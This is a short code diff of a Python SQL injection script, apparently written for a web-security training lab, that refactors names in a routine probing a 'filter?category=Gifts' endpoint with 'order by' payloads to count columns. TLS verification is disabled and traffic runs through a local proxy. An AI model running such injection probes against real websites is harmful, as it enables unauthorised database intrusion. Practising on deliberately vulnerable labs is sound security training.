@@ -4,16 +4,18 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+FAIL = -1
+
 proxies = {
     'http': 'http://127.0.0.1:8080',
     'https': 'http://127.0.0.1:8080'}
 
 def get_exploit_column_number(url):
-    uri = "filter?category=Gifts"
+    path = "filter?category=Gifts"
     for number in range(1,50):
         payload = "'+order+by+%s--" %number
         response = requests.get(
-            url + uri + payload,
+            url + path + payload,
             verify=False,
             proxies=proxies)
         if "Internal Server Error" in response.text:
@@ -29,8 +31,8 @@ if __name__ == "__main__":
     except IndexError:
         print("[-] Usage: %s <url>" % sys.argv[0])
         print("[-] Example: %s www.example.com" % sys.argv[0])
-        sys.exit(-1)
+        sys.exit(FAIL)
     except Exception as exception:
         print("An exception occured %s" % exception)
         print("[-] The SQLi attack was not successful.")
-        sys.exit(-1)
+        sys.exit(FAIL)
